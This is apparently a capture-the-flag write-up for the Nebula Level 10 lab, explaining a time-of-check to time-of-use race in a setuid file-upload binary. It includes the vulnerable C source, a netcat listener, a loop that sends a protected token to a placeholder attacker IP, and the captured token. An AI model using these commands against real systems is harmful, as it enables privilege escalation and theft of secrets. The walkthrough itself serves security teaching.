---
author: Josh Genao
Date: 2023-01-10
Category:
Tags:
---

# Level-10
## Description
The setuid binary at **/home/flag10/flag10** binary will upload any file given, as long as it meets the requirements of the _access()_ system call.

```
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```
## Setup
SSH into the Nebula VM using the following credentials:

```
username: level10
password: level10
```
## Summary
Looking at the code, we notice that there is a call to  `access(argv[1], R_OK)`

Looking at the notes section of the `access()` documentation, we will notice
```
Warning:  Using  access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and
opening the file to manipulate it.  For this reason, the use of this system call should be avoided.
```

So this function is vulnerable to time-to-check to time-to-use (TOCTOU) [^1]

We can exploit this by changing the file  during the "Vulnerable Interval" from one that will pass the "Time of Use"  check to the one that won't. We need to get access to the token file, but as we see we do not have read access to that file.

![](../imgs/Pasted%20image%2020230113095908.png)

What we can do is run a bash command that will switch the links between the file we have access to and the one we don't

![](../imgs/Pasted%20image%2020230113092947.png)

On the attacker machine, let's open a listen port on **18211** 
```
nc -nlvkp 18211
```
Where the -k command keeps listening after a connection is complete

For some reason my machine would terminate the connection once a connection has been established. So I did the following command to remain persistant on the port 18211
```
while true; do nc -nlvp 18211; done
```

On the Nebula box, we run the following command:

```
for i in {1..10000}; do /home/flag10/flag10 /home/level10/exploit [ATACKER_IP]]; done
```

On the attacker machine, wait until the symlink to the token pass the "Time of Use" check

![](../imgs/Pasted%20image%2020230113093348.png)

Bingo! We got the token :

```
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```

Now that we have the token, lets login using the data above

```
level10@nebula:~$ su - flag10
Password:
```

## Flag

![](../imgs/Pasted%20image%2020230113093641.png)
## References
[1]: https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
